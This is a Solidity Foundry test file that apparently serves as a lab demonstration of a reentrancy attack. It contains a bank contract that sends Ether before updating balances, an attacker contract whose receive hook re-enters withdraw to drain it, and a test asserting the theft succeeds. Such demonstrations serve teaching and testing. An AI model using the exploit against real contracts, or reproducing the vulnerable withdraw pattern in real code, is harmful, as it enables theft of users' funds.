// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract CryptoBank{

    mapping(address=>uint256) balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;

    }

    function withdraw(uint256 amount) public{
        require(balances[msg.sender]>= amount,"insufficient funds");
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent,"failed to send Ether");

        balances[msg.sender] -= amount;

    }
}

contract AttackBank{
    //call victimcontract
    CryptoBank public cryptoBank;

    constructor(address _cryptoBankAddress){
        cryptoBank = CryptoBank(_cryptoBankAddress);

    }

    function Attack() external payable{
        require(msg.value >= 1 ether);
        cryptoBank.deposit{value: 1 ether}();
        cryptoBank.withdraw(1 ether);
    }

    receive() external payable{
        if(address(cryptoBank).balance >= 1 ether){
            cryptoBank.withdraw(1 ether);

        }
    }
    //check on amount of ether stolen
    function getBalance() public view returns(uint){
        return address(this).balance;

    }

}

contract TestCryptoBank is Test{

    //deploy attack and bank contract
    CryptoBank public cryptoBank;
    AttackBank public attackBank;

    
    function setUp() public{
        cryptoBank = new CryptoBank();
        attackBank = new AttackBank(address(cryptoBank));
        
        
    }

    // function testCryptoBankReentrancy() public{
    //     vm.deal(address(cryptoBank), 5 ether);
    //     vm.deal(address(attackBank), 1 ether);
    //     //call function attack to initiate attack
    //     attackBank.Attack{value : 1 ether}();
    //     //check balance of AttackBank
    //     uint256 stolenAmount = attackBank.getBalance();
    //     assert(stolenAmount > 1 ether);

    //     console.log("Stolen Amount:",stolenAmount);

    // }
    function testReentrancyAttack() public {
            // Fund the CryptoBank contract with some Ether
            vm.deal(address(cryptoBank), 5 ether);
            emit log_named_uint("CryptoBank initial balance", address(cryptoBank).balance);

            // Fund the AttackBank contract with 1 Ether
            vm.deal(address(attackBank), 1 ether);
            emit log_named_uint("AttackBank initial balance", address(attackBank).balance);

            // Initiate the attack
            attackBank.Attack{value: 1 ether}();
            
            // Check the balance of the AttackBank contract to see how much Ether was stolen
            uint stolenAmount = attackBank.getBalance();
            emit log_named_uint("Stolen Amount", stolenAmount);
            assert(stolenAmount > 1 ether);

            // Check the remaining balance of the CryptoBank contract
            emit log_named_uint("CryptoBank remaining balance", address(cryptoBank).balance);
        }
    
    // function testAttack() public{
    //     //check balance before attack
    //     console.log("Crypto Bank balance before attack:", address(cryptoBank).balance);
    //     //attack first deposit then withdraw
    //     attack
    //     //check balance after attack
    // }
}